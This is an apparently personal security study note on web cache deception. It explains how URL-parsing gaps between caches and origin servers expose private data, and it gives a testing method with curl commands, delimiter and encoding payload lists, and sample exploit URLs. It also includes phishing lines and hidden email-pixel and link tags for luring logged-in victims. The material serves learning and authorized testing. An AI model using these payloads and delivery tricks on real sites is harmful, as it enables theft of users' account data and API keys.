---
created: 2026-05-20
tags:
  - web_caches
  - intermediaries
status: substantial
---
## Web Cache Deception


>**Web Cache Deception (WCD)** is a security vulnerability that allows an attacker to cause a shared web cache to mistakenly store sensitive, user-specific dynamic content as publicly cacheable. The attacker can the retrieve the cached resource and gain unauthorized access to private information.

- The vulnerability exploits discrepancies between how the web cache and the origin server interpret HTTP requests.
- The goal of a WCD attack is to make the cache treat a sensitive, dynamic response from the server as static, and store it for public access.

>[!important] Web Cache Deception is primarily a sensitive information disclosure vulnerability.

>[!note] To learn more how web caches work under the hood, see [[Web caches]]. This article assumes you are familiar with the concepts described there.

## How web cache deception works

The root cause of web cache deception vulnerabilities lies in **discrepancies between how the origin server and web cache interpret the same URL**:

- The **origin server** may *ignore* or *tolerate* certain parts of a request URL, such as undefined query parameters, delimiters, or non-existing file extensions. This often happens because of URL normalization rules the server implements.
- The **cache server** (CDN node/proxy server) often treat *the full URL literally* and cache resources based on static file extensions (`.css`, `.js`, `.jpg`) or path prefixes (`/static`, `/assets`, `/images`). The caching proxy is **not aware of any backend URL normalization rules**; it stores everything that deems appropriate unless explicitly indicated in HTTP headers.

>[!bug] If such discrepancies exist, you can manipulate the URL to trick the cache server into **mistakenly treating a dynamic, user-specific content** as a **generic, static resource** and store it under a publicly accessible cache key. 
>- You can then retrieve the cached response by accessing the same crafted URL (before the cache entry expires).

This vulnerability is called **Web Cache Deception (WCD)**.

>[!example]+
> - You find an authenticated, user-specific endpoint that returns sensitive data, such as an API key:
> 
> ```http
> /user/profile
> ```
> 
> - You notice that if you append a non-existing file extension to the endpoint URL, such as `/user/profile/nonexistent.css`, the origin **ignores the prefix** and treats the path **identically to `/user/profile`**.
> 
> ```http
> /user/profile/nonexistent.css
> ```
> 
> - The cache server sitting between you and the origin, however, treats `/user/profile` and `/user/profile/nonexistent.css` as **two separate resources**.
> - The cache is configured to **store all files with static extensions**, including `.css`, for public access.
> 
> This means a **web cache deception attack is possible**.
> 
> 1. You trick a victim into visiting the `/user/profile/wcd.css` endpoint (non-existing resource).
> 2. The backend server ignores `wcd.css` and treats it same as `/user/profile`. It generates a user-specific response (based on the victim's authenticated identity) with an API key and sends it.
> 3. The cache server treats a response to `/user/profile/wcd.css` as a **static CSS file** and **caches that response under a publicly accessible cache key**, `/user/profile/wcd.css`.
> 4. You access `/user/profile/wcd.css` and **retrieve the user profile page with an API key from the cache**. The data is stolen!

> [!important] Most caching servers are configured to automatically store resources with:
> - **Static file extensions** (`.css`, `.js`, `.jpg`, etc.).
> - **Static directories** (`/static`, `/assets`, `/images`).
> - **File names** (`favicon.ico`, `robots.txt`, etc.).
> - **Custom parameters** (query strings like `cache=true` or other request parts).

>[!important] **Cache servers do not verify if the URL is truly a static resource and treat the full URL literally.**

>[!important]+ The victim must visit your crafted URL from an **authenticated session**. 
>- When you retrieves a cached response, you don't need any victim credentials, since the response is stored under a genetic cache key.

- A successful WCD attack requires:

	- A **caching layer** (cache server, CDN, reverse proxy, etc.) in front of the target application.
	- **Caching rules** that rely on URL patterns (e.g., file extensions); the cache key doesn't include user-specific headers such as cookies or `Authorization`.
	- The presence of **dynamic endpoints** that return **user-specific or sensitive data**.
	- A **URL parsing discrepancy**: the origin server ignores certain parts of URLs that the cache takes into account.
	- The ability to trick a victim into visiting a crafted URL while authenticated.
## Testing for web cache deception

- A testing methodology for a WCD consists of the following steps:
	1. **Analyze caching infrastructure**
		- Confirm the cache exists and find a reliable indicator of whether a given resource was served from the cache or the origin server. 
	2. **Identify a target endpoint**
		- Locate a target endpoint that returns a dynamic response containing sensitive information. The response must be cacheable (cacheable method, `GET` or `HEAD`).
	3. **Discover a URL parsing discrepancy**
		- Identify a discrepancy in how the cache and origin server parse the URL. The discrepancy could be in how they map URLs to resources, process delimiter characters, normalize paths, etc.
	4. **Craft an exploit URL**
		- Construct a URL that exploits the discrepancy to trick the cache into storing a dynamic response. 
	5. **Deliver exploit to victim**
		- Make the target user click the URL so the response is stored in a shared cache under a known, publicly-accessible cache key.
	6. **Retrieve the cached response**
		- Access the same URL from a fresh, unauthenticated session, and extract sensitive information from the cached response. 

### Step 1: Analyze caching infrastructure

- Before probing the application for parsing discrepancies, establish whether a shared cache is present, where it sits, and what it caches.
- Perform this reconnaissance on **non-sensitive, publicly accessible resources** so that you neither pollute the cache with authenticated content nor trip rate limits on protected endpoints.

#### Cache oracles 

>A **cache oracle** is any observable response feature that reliable distinguishes a response served from a cache from one served by the origin. 

- Without a cache oracle, you can't reliably confirm exploitation. 

- Cache oracles fall into three categories, from the most to the least reliable: 
	- **Explicit cache-state response headers** added by the cache.
	- **Indirect indicators** (the `Age` header, `Via` chain, `Server-Timing`).
	- **Response time differences** between cache hits and cache misses.

- To identify a cache oracle, you can follow these steps:

	1. **Select candidate test endpoints**
		- Focus on resources that are **likely to be cached**, such as:
			- Static assets (JavaScript, CSS, images).
			- Publicly accessible dynamic pages (e.g., homepage, product listings, search results, blog posts).
			- API endpoints (especially those returning the same data for all users or with cacheable responses).
	
	2. **Send an initial baseline request to each candidate endpoint**
		- Use a web proxy (e.g., Burp Suite, OWASP ZAP) to intercept and record HTTP traffic.
		- This first request is likely to be served **from the origin server** (cache miss).
		- Save the full HTTP response headers and body for baseline comparison.
	
	3. **Send multiple identical requests to the same endpoint without changing anything**
		- Observe if subsequent responses differ from the first in terms of:
		    - Response time (cached responses are usually faster).
		    - Response headers indicating cache hits.
	
	4. **Analyze HTTP responses for caching indicators**
		- Check for caching:
			- Look for CDN/proxy-specific HTTP headers (e.g., `X-Cache`, `CF-Cache-Status`, `Age`, `Via`, etc.).
			- Analyze and compare response times for cache hit vs. cache miss.
			- Check for static resource domains.
			- Use online tools for fingerprinting.

>[!tip]+ 
> - **Cacheable resources** typically have:
> 	- `Cache-Control: public` and/or `max-age` with a value greater than zero (see [[Web caches#Cache control]]).
> 	- `Expires` set to a future date.
> 
> - Headers that often indicate **non-cacheable resources**:
> 	- `Cache-Control: private`, `no-store`, or `no-cache` directives.
> 	- `Pragma: no-cache` is present (the [`Pragma` HTTP header](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Pragma) is legacy and deprecated, but still respected by some caches).
> 
> - **Conditional caching**:
> 	- If `Vary` is present, the cache will store different versions based on the specified headers (e.g., `Vary: User-Agent`).
> 
>>[!note] If a resource is marked non-cacheable, this doesn't necessarily mean that it won't be stored by the cache server; some CDNs may ignore these directives.
##### Explicit cache-state headers 

| Header                 | Defined / used by                                         | Values of interest                                            |
| ---------------------- | --------------------------------------------------------- | ------------------------------------------------------------- |
| `X-Cache`              | Varnish, CloudFront, generic                              | `Hit`, `Miss`, `Dynamic`, `Refresh`, `Bypass`.                |
| `CF-Cache-Status`      | Cloudflare                                                | `HIT`, `MISS`, `EXPIRED`, `BYPASS`, `DYNAMIC`, `REVALIDATED`. |
| `X-Cache-Hits`         | Varnish, Fastly                                           | Integer hit count.                                            |
| `X-Served-By`          | Fastly                                                    | POP identifier, e.g. `cache-lhr7374-LHR`.                     |
| `X-Cache-Lookup`       | Akamai, AWS                                               | `HIT`, `MISS`.                                                |
| `X-Akamai-Transformed` | Akamai                                                    | Indicates Akamai is in the path.                              |
| `X-Varnish`            | Varnish                                                   | XID (or two XIDs on a hit).                                   |
| `Age`                  | [`RFC 9111`](https://www.rfc-editor.org/rfc/rfc9111.html) | Seconds the response has been cached.                         |
| `Via`                  | [`RFC 9110`](https://www.rfc-editor.org/rfc/rfc9110.html) | Lists intermediate proxies.                                   |
| `Server-Timing`        | Modern caches                                             | May contain `cdn-cache;desc=HIT`.                             |

- Check cache-relevant headers:

```bash
curl -sSI "https://target.example/style.css" | grep -iE 'cache|age|via|x-served-by|akamai|cf-|varnish|server-timing'
```

- Monitor cache status changes:

```bash
watch -n 1 'curl -s -I "https://example.com/api/profile" | grep -i x-cache'
```

>[!note] A `MISS` on the first request, followed by `HIT` on the second identical request, is a clear confirmation that the resource is cacheable and that you have correctly identified the oracle. Always send the second request a few seconds later; some edges populate asynchronously.

>[!tip]+ 
> The **`X-Cache` header** is commonly used to indicate if the response was served from the cache:
> 
> | Value              | Description                                                                                         |
> | ------------------ | --------------------------------------------------------------------------------------------------- |
> | `X-Cache: Hit`     | The response is served by a cache.                                                                  |
> | `X-Cache: Miss`    | The response is fetched from the origin.                                                            |
> | `X-Cache: Dynamic` | The content was dynamically generated by the origin; generally means the response is not cacheable. |
> | `X-Cache: Refresh` | The currently cached response is stake and needs to be refreshed or revalidated.                    |
> | `X-Cache: Bypass`  | The cache was bypassed for some reason.                                                             |
>>[!note] This header sometimes includes the name of the CDN, e.g., `X-Cache: hit from cdn.example.com`.
##### The `Age` header as an oracle

- The `Age` header indicates how long (in seconds) the content has been cached:

```HTTP
Age: 3990
```

- `Age: 0` on the first request indicates the cache has just fetched the response from the origin (cache miss).
- Any positive value on a subsequent identical request confirms it is being served from cache rather than from the origin. 

```bash
# first request — Age missing or 0 -> confirms cache miss
curl -sSI "https://example.com/user/profile/wcd.css" | grep -i '^age:'

sleep 3

# second request — Age > 0 -> confirms cache hit
curl -sSI "https://target.example/profile/test.css" | grep -i '^age:'
```

##### Response time analysis

- In the absence of any explicit oracle, latency is the fallback signal. 
- Cache hits are served from the nearest edge; cache misses traverse the public internet to the origin.


> [!note] Latency-based oracles are noisy. Run at least five trials per condition and discount outliers. Geographic distance to the origin amplifies the signal; testing from a VPS in a distant region often makes the difference more obvious.

#### The `Vary` header 

- The **`Vary` response header** lists request headers that must form part of the cache key. 
- With correctly configured caching, authenticated responses would set `Vary: cookie` to ensure each user's response is stored separately. Its absence on a dynamic endpoint is a strong precondition for WCD.

```bash
curl -sSI "https://target.example/my-account" | grep -i '^vary:'
```

> [!note] Even when `Vary: Cookie` is set, some CDNs ignore it for resources that match a static-asset rule.
#### Fingerprinting the caching layer 

- Identifying the specific CDN / reverse proxy later helps narrowing down the URL parsing discrepancies you should target. 

Pay attention to:

- **DNS names:**

	```bash
	# CNAME chain often reveals the CDN
	dig +short CNAME www.example.com
	dig +short www.example.com
	```
	
	- `cdn.cloudflare.net` -> Cloudflare (less common; Cloudflare usually uses `A`/`AAAA`)
	- `*.cloudfront.net` -> AWS CloudFront
	- `*.akamai.net` -> Akamai
	- `*.fastly.com` -> Fastly
	- `*.azureedge.net` -> Microsoft Azure CDN
	- `*.jsdelivr.net` -> jsDelivr
	- etc.

- **HTTP headers:**

	```bash
	curl -sSI "https://example.com" | grep -iE 'server|x-served-by|x-cache|cf-ray|x-amz-cf'
	```
	
	- `Server: cloudflare` or `cf-ray:` header → Cloudflare
	- `x-amz-cf-id:` → CloudFront
	- `x-served-by: cache-*` with airport codes → Fastly
	- `server: AkamaiGHost` → Akamai
	- `x-azure-ref:` → Azure Front Door / CDN

- **Asset loading:**
	- In the page's HTML, inspect where static assets are loaded from. Subdomains like `cdn.target.example`, `static.target.example`, or third-party CDN domains tell you both that a cache exists and which vendor is in use.

- **Online tools:**
	- Online web fingerprinting services that can detect caching automatically, such as:
		- [`CDN Finder`](https://www.cdnplanet.com/tools/cdnfinder/)
		- [`SEO Site Checkup — CND Usage Test`](https://seositecheckup.com/tools/cdn-usage-test)
		- [`Wappalyzer`](https://www.wappalyzer.com/) — technology detection
		- [`BuiltWith`](https://builtwith.com/) — technology profiler
### Step 2: Identify a target endpoint

- Search for a target endpoint that:
	- Requires authentication.
	- Responds to a **cacheable method** (`GET`, `HEAD`).
	- Contains sensitive data in the response body (can be an HTML page, API response, etc.).

>[!warning] Target endpoints must respond to **cacheable HTTP methods**: `GET` or `HEAD`. Unsafe methods (`POST`, `PUT`, `DELETE`) typically **bypass caching** or trigger **cache invalidation**, so they're not suitable for the attack.

>[!tip]+ Enumerate files and directories on the target application to discover the attack surface and find sensitive endpoints. 

```powershell
# identity and session
/my-account
/account/profile
/user/me
/api/v1/user
/dashboard
/settings

# tokens, keys, secrets
/api/keys
/api/tokens
/api/credentials
/.well-known/...
/api/csrf
/api/config

# financial data
/billing/invoices
/orders/history
/api/payment-methods
/api/balance

# administrative
/admin/users
/admin/logs
/management/status
```

- The response content must contain information valuable enough to warrant an attack. Check responses for:
	- Session / authentication credentials
	- Personally Identifiable Information (PII)
	- Email addresses and phone numbers
	- Payment information
	- API keys and secrets
	- Internal system information
	- Database queries or errors
	- File paths and system information
	- User permissions and roles
	- etc.

>[!tip] Look beyond rendered HTML; check raw responses in the proxy as well (e.g., JSON, XML returned by API endpoints).

- Once you found an endpoint, check if it can be cached (use caching indicators discovered in Step 1).
- Save the full baseline request and response. 

### Step 3: Discover a URL parsing discrepancy

- Prove how the origin parses the URL, probe how the cache parses it, then look for the gap — the discrepancy.
- The goal is to detect what parts of the URL the origin ignores but the cache uses in the cache key.
- The discrepancies are commonly:
	- **Path mapping discrepancies**
	- **Delimiter discrepancies**
	- **Delimiter decoding discrepancies**
	- **Normalization discrepancies**

>[!example]+
> - To test for path mapping discrepancies, append a non-existing static flie to the target URL path, such as  `wcd.css`:
> 
> ```PowerShell
> /profile/wcd.css 
> ```
> 
> - Possible responses:
> 	- **`404 Not Found`** — the origin treats the modified URL as a completely different resource; **not vulnerable to path mapping discrepancies** (but may be vulnerable to others).
> 	- **Same `/profile` data** — the origin server ignores `wcd.css` completely; **likely vulnerable** to web cache deception.
> 	- Error about CSS format — the origin server tries to format the original page as CSS, but encounters syntax errors; **worth further investigations** (try different file extensions — maybe you can make the server return the sensitive data in a format the cache server will store).
> 
> - If the origin ignores the path you appended but the cache server stores the response based on the extension, **it is likely that you found a web cache deception vulnerability**.

>[!important] Once you detect a URL parsing discrepancy that can potentially be used in WCD attacks, always check whether the modified URL can be cached (use a caching oracle you discovered in step 1).

>[!tip] Use **cache busters** to avoid hitting cached responses
>- **Cache busters** are random query parameters, e.g., `?buster=random123` used to force a cache server to treat each request as unique. This is done to avoid hitting cached resources.
>- Tools like Param Miner (Burp Suite extension) automatically add dynamic cache buster (if you configure it to do so) to every request you make during testing to avoid cached resources.
#### Path mapping discrepancies

- Append an arbitrary path segment or a static extension to a dynamic endpoint, and compare the response with the baseline.

```PowerShell
/user/profile/anything
/user/profile/wcd.css 
/user/profile/ignore.js 
/user/profile/image.jpg
/user/profile/fake.png
/user/static/profile
```

- If the body matches the baseline response, the origin ignores the segment.
- If the response is a `404` or an unrelated page, the origin enforces strict path matching. Move on to delimiters or normalization.

>[!note]- List of static extensions
> 
> ```bash
> # web assets
> .css    # Stylesheets
> .js     # JavaScript files
> .jsx    # React components
> .ts     # TypeScript files
> .scss   # Sass stylesheets
> .less   # Less stylesheets
> 
> # images
> .png    # PNG
> .jpg    # JPEG
> .jpeg   # JPEG
> .gif    # GIF
> .svg    # SVG
> .webp   # Google WebP format
> .bmp    # bitmap images
> .ico    # icon files
> .tiff   # tagged Image File Format
> 
> # fonts
> .woff   # Web Open Font Format
> .woff2  # Web Open Font Format 2.0
> .ttf    # TrueType fonts
> .otf    # OpenType fonts
> .eot    # embedded OpenType
> 
> # documents and data
> .pdf    # PDF
> .txt    # plain text files
> .xml    # XML
> .json   # JSON
> .csv    # CSV
> .xlsx   # Excel spreadsheets
> .docx   # Word documents
> 
> # audio/video
> .mp3    # audio files
> .mp4    # video files
> .avi    # audio Video Interleave
> .mov    # QuickTime movies
> .wmv    # Windows Media Video
> 
> # archives
> .zip    # ZIP archives
> .rar    # RAR archives
> .tar    # tape archives
> .gz     # Gzip compressed
> 
> # web-specific
> .map         # source maps
> .manifest    # cache manifests
> .webmanifest # web app manifests
> 
> # development
> .min.js    # minified JavaScript
> .min.css   # minified CSS
> .bundle.js # bundled JavaScript
> ```

- The web server might behave differently depending on the framework in use:

```bash
# Ruby on Rails - format specifiers
/users/123.json     # JSON format
/users/123.xml      # XML format
/users/123.csv      # CSV format
/users/123.atom     # Atom feed

# ASP.NET - file extensions
/Profile.aspx/fake.css
/api/Data.asmx/dummy.js

# PHP - path info
/api/profile.php/fake.css
/user.php/data.json

# Node.js/Express - route handling
/api/user/profile.json
/data/sensitive.js
```
#### Delimiter discrepancies

- The same character may be treated differently by the origin server and the cache; the origin may treat  as a URL path delimiter by the origin server and a regular part of the path by the cache server. 

- The URI standard ([`RFC 3986`](https://datatracker.ietf.org/doc/html/rfc3986)) defines certain characters as path delimiters:
	- `?`: Marks the start of URL query string.
	- `&`: Separates query parameters.
	- `#`: Indicates an anchor or fragment; never sent to the server.
- Many web frameworks implement custom URL delimiters to extend this set. For example, Java Spring uses a semicolon (`;`) for [matrix variables](https://docs.spring.io/spring-framework/reference/web/webmvc/mvc-controller/ann-methods/matrix-variables.html).

| Framework / server                     | Custom delimiter                   | Behavior                                                       |
| -------------------------------------- | ---------------------------------- | -------------------------------------------------------------- |
| Java Spring (and Spring Boot)          | `;`                                | Matrix variables: `/account;v=1/orders` → `/account/orders`.   |
| Ruby on Rails                          | `.` (with unrecognised extensions) | Format hint: `/profile.aaaa` → `/profile` (default HTML view). |
| OpenLiteSpeed                          | `%00`                              | Encoded null truncates the path.                               |
| Nginx (with path-prefix rewrite rules) | `%0a`                              | Encoded newline truncates after rewrite.                       |
| ASP.NET (classic)                      | `;` and `,`                        | Variously used in routing.                                     |

- The cache, by contrast, almost never recognizes characters not defined in `RFC 3986` as delimiters — it treats the URL as an opaque string up to `?`.

---
- Non-standard delimiters create a URL parsing discrepancy between the origin and the cache:
	- The **origin server** may treat a delimiter as a path separator and truncate or interpret the URL up to that delimiter.
	- The **cache** (CDN, reverse proxy) may **not recognize the delimiter** and treat the entire URL, including the delimiter and the file extension after it, as a static resource path.

---
- To identify the origin server delimiters:
	
	1. `R0`: Send a baseline request to the target endpoint; add a cache buster to ensure the response is served from the origin:
		
		```http
		GET /user/profile?cb=1
		```
	
	2. `R1`: Append a random alphanumeric string with no separator (change the cache buster):
		
		```http
		GET /user/profilewcd.css?cb=2
		```
		
		- The application should respond with `404 Not Found`. 
		- If the response is identical to the baseline and the application ignores the suffix, pick a different endpoint.
	
	3. `R2`: Insert a candidate delimiter character between the original path and the random suffix. 
		
		```http
		GET /user/profile;wcd.css?cb=2
		```
		
		- If the response is same as the baseline (`R2 == R0`) -> the origin treats the candidate as a delimiter; this is the finding you want.
		- If the response is same as with no delimiter (`R2 == R1`) -> the candidate is not a delimiter; the origin treats it as a literal path character. 
		- If neither (`R2 != R0 && R2 != R1`) -> either a partial match (e.g., URL normalization kicked in but produced an unexpected route), or a server error; worth further investigation. 

```PowerShell
/user/profile;wcd.css -> /user/profile        # delimiter
/user/profile;wcd.css -> /user/profilewcd.css # not delimiter
```

>[!example]-
> ```PowerShell
> # basic delimieter injection
> /profile;v=1.2 
> /profile,,/
> /profile// 
> /profile;//
> /profile;anything
> /profile///extra
> /profile/abc
> /profile;wcd.css
> 
> 
> /profile;v=1.2 
> /profile,,/
> /profile// 
> /profile;//
> /profile;anything
> /profile///extra
> /profile/abc
> /profile;wcd.css
> ```
> 
> - Framework-specific examples:
> 
> ```PowerShell
> # Java Spring semicolon delimiters used for matrix variables:
> /api/data;v=1.2/profile -> /api/data/profile 
> /profile;v=a;v=b -> /profile
> 
> # OpenLiteSpeed null byte:
> /profile%00aaaa -> /profile 
> 
> # Nginx newline-encoded byte:
> /profile%0axxxx -> /profile # rule: rewrite /user/(.*)/account/$1 break;
> ```

>[!tip] Use the PortSwigger's [Web cache deception lab delimiter list](https://portswigger.net/web-security/web-cache-deception/wcd-lab-delimiter-list).

>[!note]- List of delimiters to test
> ```
> '  
> !  
> "  
> #  
> $  
> %  
> &  
>  (  
> )  
> *  
> +  
> ,  
> -  
> .  
> /  
> :  
> ;  
> <  
> =  
>  
> ?  
> @  
> [  
> \  
> ]  
> ^  
> _  
> `  
> {  
> |  
> }  
> ~  
> %21  
> %22  
> %23  
> %24  
> %25  
> %26  
> %27  
> %28  
> %29  
> %2A  
> %2B  
> %2C  
> %2D  
> %2E  
> %2F  
> %3A  
> %3B  
> %3C  
> %3D  
> %3E  
> %3F  
> %40  
> %5B  
> %5C  
> %5D  
> %5E  
> %5F  
> %60  
> %7B  
> %7C  
> %7D  
> %7E
> ```

- The most efficient way to enumerate delimiters is using Burp Intruder:

	1. Set the request to the path with the random suffix; insert a placeholder for a delimiter as the first payload, and a cache buster as the second:
	
	```
	/user/profile§§wcd.css?cb=$RANDOM
	```
	
	2. Load a list of delimiters as a payload set.
	3. In the `Payloads` side panel, **disable Intruder's automatic URL encoding**. Otherwise, Intruder will re-encode your already-encoded payloads (`%00` will become `%2500`).
	4. Run the attack. Sort the result table by response length. Responses matching the baseline length are your delimiter candidates.

- Once you have a delimiter that the origin recognizes, append a static extension to confirm the cache does _not_ recognize it:

	```http
	GET /settings/users/list;wcd.css?cb=4 HTTP/1.1
	```

- Send twice. A `Hit`/`Age > 0` on the second request confirms the cache treats `;wcd.css` as part of the path and caches based on the `.css` extension.
#### Delimiter decoding discrepancies

- A *delimiter decoding discrepancy* is more subtle; the cache and origin agree on the set of delimiter characters but disagree on *when* to URL-decode them:
	- The **origin** decodes percent-encoded sequences *before parsing the path*, so `%23` becomes `#` and acts as a delimiter. 
	- The **cache** parses the URL first, so `%23` is treated as three literal bytes that are part of the path string.

> [!example]+
> Consider `/user/profile%23wcd.css`:
> 
> - Origin: decodes `%23` → `#`, recognizes `#` as fragment delimiter, and ignores everything after it; the path becomes `/user/profile`.
> - Cache: does not decode, the path is `/user/profile%23wcd.css`; since it ends with `.css`, this files a caching rule.

>[!note] This is the only practical way to weaponize `#` for WCD, because an unencoded `#` is stripped by the browser. The same logic applies to other encoded delimiters: `%3F` (`?`), `%3B` (`;`), `%00`, `%0A`, `%09`.

##### Forwarding rewrites

Some caches decode the URL _after_ applying the cache rule but _before_ forwarding it to the origin. Consider `/user/profile%3Fwcd.css` arriving at the cache:

1. The cache evaluates rules against the literal encoded string `/user/profile%3Fwcd.css`. The path ends in `.css`, so the cache decides to store the response.
2. The cache decodes `%3F` to `?` and forwards `/user/profile?wcd.css` to the origin.
3. The origin sees the query delimiter `?`, parses the path as `/user/profile`, and returns the dynamic response.
4. The cache stores it under the original encoded key.

This forwarding-transformation behavior is documented for Cloudflare, CloudFront, Google Cloud, and several others. It is what allows `%3F` to be used as a deception delimiter even though `?` is a "standard" delimiter both sides know about.

>[!tip]+ 
>Common static URL path prefixes:
> 
> ```powershell
> /static
> /assets
> /images
> /public
> /content
> /media
> /css
> /js
> /img
> /scripts
> /fonts
> /files
> /uploads
> /resources
> ```

>[!important]+ When testing for normalization, start by encoding only the second slash in the dot-segment. This is important because some CDNs match the slash following the static directory prefix.
#### Normalization discrepancies

>**Path normalization** is the process of converting a URL path to its canonical (standard) form by resolving relative references, removing redundant components, and applying standard formatting rules.

```PowerShell
# standard normalization examples:
/api/./profile        -> /api/profile          # remove single dot
/api/../profile       -> /profile              # remove double dot  
/api//profile         -> /api/profile          # remove double slash
/api/user/../profile  -> /api/profile          # resolve parent directory
/api/./user/./profile -> /api/user/profile     # multiple dot removal
```

- Normalization discrepancies arise when the cache and the origin apply different rules for resolving dot-segments (`./` and `../`) and percent-encoding slashes (`%2F`). 
- `RFC 3986` prescribes an algorithm for this, but the most widely deployed server and CDNs implement it inconsistently.
- The exploitation surface is largest against **static directory** and **static filename** cache rules (e.g., `/static`). 
- With a normalization gap, you can route a request through a cache rule that fires on a path that the origin server, after normalization, treats as something entirely different.
---
Two directions to exploit:

1. **Origin normalizes, cache does not**

```powershell
/<static-directory-prefix>/..%2f<dynamic-resource>
```

>[!example]+
>-  `/assets/..%2fuser/profile`
> 
> 	- Cache: sees the literal string, matches the `/assets` static-directory ryle, decides to cache.
> 	- Origin: decides `%2f`, resolves `..`, normalizes to `/user/profile`, serves the dynamic response.
>
>- Result: dynamic response is stored under `/assets/..%2fuser/profile`.

2. **Cache normalizes, origin does not**

```powershell
/<dynamic-resource><delimiter>%2f%2e%2e%2f<static-directory-prefix>
```

>[!example]+
> - `/user/profile;%2f%2e%2e%2fstatic` (assuming `;` is an origin delimiter)
> 
> 	- Cache: resolves the encoded dot-segment, normalizes to `/static`, matches static-directory rule, caches.
> 	- Origin: does not normalize; the `;` delimiter truncates the path; origin sees `/user/profile` and serves the dynamic response.
> - Result: dynamic response is stored under the cache key `/static`.

> [!important]+ Encode all dot-segments 
> - The browser will resolve unencoded `..` _before_ the request leaves the user agent. 
> - To make the path traversal survive transport, every segment must be percent-encoded: `..%2f` or `%2e%2e%2f`. The cache or origin will resolve the encoded form during normalization; the browser will not.

- Some servers normalize double slashes, while caches may treat them literally:

```PowerShell
# double slash normalization
/api//profile/fake.css     # /api/profile/fake.css (normalized)
/user///data//info.js      # /user/data/info.js (normalized)
/profile////settings.css   # /profile/settings.css (normalized)
```

- Test various encoding techniques that might bypass cache logic:

```PowerShell
# URL encoding variations
/api/profile%2Ffake.css     # %2F = /
/api%2Fprofile/fake.css     # encoded slash in path
/api/profile%2Ecsss         # %2E = .

# double URL encoding
/api/profile%252Ffake.css   # %25 = %, so %252F = %2F

# Unicode normalization
/api/profile/fake%C4%85.css # Unicode characters
/api/profile/fake%E2%80%8D.css # Zero-width joiner

# mixed encoding
/api/profile%2ffake.CSS     # mixed case extension
/api/profile%5cfake.css     # backslash instead of forward slash

# overlong UTF-8 encoding
/api/profile%C0%AEfake.css
/api/profile%E0%80%AEfake.css

# IIS-specific encodings
/api/profile%u002ffake.css  # IIS Unicode
/api/profile\fake.css       # Backslash on Windows

# null byte injection
/api/profile%00fake.css
/api/profile/fake%00.css
```

### Step 4: Craft an exploit URL

- Once you have a confirmed discrepancy and a matching cache rule, construct the URL you will deliver to the victim.

- Three main considerations:
	- **Choose an extension and path that maximizes cache TTL**
		- Static assets are cached for longer than dynamic ones; the longer the cache lifetime, the longer your exploitation window before the cache entry must be refreshed.
	- **Avoid suspicious-looking artifacts**
		- A URL containing `;wcd.css` or `wcd-test.js` may attract attention from a security-conscious victim or be flagged by an anti-phishing filter. 
		- Use names that fit the application's existing static assets (e.g., `style.css`, `bundle.js`, `logo.png`, `favicon.ico`).
	- **Ensure the URL survives after browser processing**
		- Re-verify that every character in the final URL survives the browser's URL processing. The browser will:
			- Strip everything after `#` (use `%23` instead).
			- Re-encode `{`, `}`, `<`, `>`, spaces, and most non-ASCII bytes.
			- Resolve `..` and `.` segments unless encoded.

| Extension class                        | Typical CDN TTL    | Notes                          |
| -------------------------------------- | ------------------ | ------------------------------ |
| `.css`, `.js`, `.woff`, `.woff2`       | Hours to days      | Default on most CDNs.          |
| `.png`, `.jpg`, `.gif`, `.svg`, `.ico` | Hours to days      | Default on most CDNs.          |
| `.json`, `.xml`, `.txt`                | Minutes to hours   | Sometimes excluded by default. |
| `.html`, `.htm`                        | Seconds to minutes | Rarely a useful target.        |

### Step 5: Deliver exploit to victim

>[!important] The victim must be authenticated when their browser issues the request. 

- Common delivery vectors:
	- **Phishing** — a link in an email styled as a legitimate notification from the target.

	```bash
	"Check out this important security update: https://bank.com/security/update.css"
	"Download your statement: https://bank.com/statements/latest.pdf"
	```

	- **HTML email tracking pixel** — `<img src="https://example.com/my-account;style.css" width="1" height="1">`. Triggers a `GET` automatically when the email is opened in an HTML-rendering client (no link clicks are needed).

	```html
	<!-- email tracking pixel -->
	<img src="https://example.com/my-account;style.css" style="display:none">
	```
	
	- **[[XSS]]** — if you control a third-party site the victim visits while authenticated, you can embed an `<img>`, `<script>`, or `<link>` that sources your exploit URL. Cross-origin `GET`s do not require CORS (well, unless `SameSite=Strict` for session cookies; see [[CSRF]]).


	```html
	<link rel="stylesheet" href="https://example.com/my-account;style.css">
	```

### Step 6: Retrieve the cached response

- To retrieve the stored response, request the same URL on a clean session. 
- Two important conditions:
	- **Identical cache key**
		- The URL must match byte-for-byte; differences in casing, trailing slashes, or query parameters may generate a different cache key and miss the stored response.
	- **Same cache server**
		- CDNs distribute caches across geographically dispersed edge nodes. Your request must land on the same edge that stored the victim's response.
		- This is largely determined by source IP address geography; a VPS in the victim's region usually solved it.
		- Additionally, requests may be distributed across multiple nodes even in the same location; in this case, retry the request multiple times to hit the same node.

>[!tip]+
> - To avoid hitting your own cached page, try to:
> 	- Access from different IP addresses
> 	- Use different `User-Agent` strings
> 	- Clear browser cache
> 	- Use incognito/private browsing mode
> 	- Test from different geographic locations (VPNs)

## References and further reading

- [`Gotta cache 'em all: bending the rules of web cache exploitation — Martin Douyenard, PortSwigger Research`](https://portswigger.net/research/gotta-cache-em-all)
- [`Web cache deception — PortSwigger Web Security Academy`]()

- [`Web Cache Deception — swisskyrepo/PayloadsAllTheThings`](https://swisskyrepo.github.io/PayloadsAllTheThings/Web%20Cache%20Deception/#references)

- [`Web Cache Deception Attack — Omer Gil`](https://omergil.blogspot.com/2017/02/web-cache-deception-attack.html)
- [`Web Cache Deception Attack — Omer Gil, BlackHat 2017`](https://www.blackhat.com/docs/us-17/wednesday/us-17-Gil-Web-Cache-Deception-Attack.pdf)
- [`Web Cache Deception Attacks — Security Café`](https://securitycafe.ro/2022/07/01/web-cache-deception-attacks/)


- [`How to Find the CDN Used by a Website — GeekFlare`](https://geekflare.com/cloud/find-cdn-used-on-site/)

